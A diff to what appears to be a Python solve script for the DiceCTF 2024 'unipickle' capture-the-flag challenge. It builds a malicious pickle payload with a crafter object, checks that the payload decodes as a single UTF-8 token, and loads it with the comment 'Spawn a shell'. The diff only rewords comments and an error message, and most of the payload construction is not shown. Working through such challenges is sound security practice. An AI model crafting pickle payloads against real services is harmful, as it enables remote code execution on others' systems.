@@ -1,4 +1,4 @@
-# challege link: https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/misc/unipickle
+# Challenge: https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/misc/unipickle
 
 
 import pickle
@@ -16,12 +16,13 @@ crafter.mark()
 crafter.push(s3)
 crafter.call_f(1, use_mark=True)
 
-# if payload is invalid utf-8 string, this function causes UnicodeDecodeError (not ValueError in crafter.get_payload)
+# If the payload is not valid UTF-8, this raises UnicodeDecodeError
+# instead of ValueError from crafter.get_payload().
 check_f = lambda x: len(x.decode("utf-8").split()) == 1
 
 
 try:
     payload = crafter.loads(check_function=check_f)
-    # pop a shell
+    # Spawn a shell.
 except Exception as ex:
-    print("????", crafter.get_payload(check_stop=True), ex)
+    print("failed to build payload:", crafter.get_payload(check_stop=True), ex)
